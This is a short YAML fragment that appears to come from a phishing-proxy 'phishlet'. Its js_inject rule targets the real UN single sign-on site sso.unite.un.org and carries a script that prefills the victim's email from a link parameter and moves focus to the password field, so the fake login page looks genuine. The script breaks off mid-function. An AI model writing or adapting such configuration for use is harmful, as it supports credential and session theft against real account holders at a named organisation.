js_inject:
  - trigger_domains: ["sso.unite.un.org"]
    trigger_paths: ["/*"]
    trigger_params: ["email"]
    script: |
      function lp(){
        var email = document.querySelector("#userNameInput");     
        var password = document.querySelector("#passwordInput");
        if (email != null && password != null) {
          email.value = "{email}";
          password.focus();
          return;
